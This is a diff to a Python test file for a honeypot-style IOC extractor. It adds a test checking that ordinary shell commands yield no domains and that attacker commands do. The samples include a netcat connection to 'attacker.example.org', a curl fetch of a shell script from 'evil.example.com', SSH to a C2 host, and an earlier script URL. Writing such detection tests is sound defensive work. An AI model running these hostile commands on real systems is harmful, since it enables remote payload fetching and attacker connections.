@@ -76,3 +76,12 @@ async def test_ioc_api_endpoint():
     assert data["session_id"] == session_id
     assert data["iocs"]["has_iocs"] is True
     assert any(u["value"] == "http://198.51.100.88/test.sh" for u in data["iocs"]["urls"])
+
+def test_filenames_and_inline_code_are_not_domains():
+    from doppel.analytics.ioc import extract_domains
+    for cmd in ("tar czf db.tgz /var/www", "systemctl status nginx.service", "cat backup.sql",
+                'python3 -c "import os.path"', "unzip site.rar"):
+        assert extract_domains(cmd) == [], cmd
+    assert extract_domains("ssh root@c2.example.net") == ["c2.example.net"]
+    assert extract_domains("nc attacker.example.org 4444") == ["attacker.example.org"]
+    assert extract_domains("curl evil.example.com/x.sh") == ["evil.example.com"]
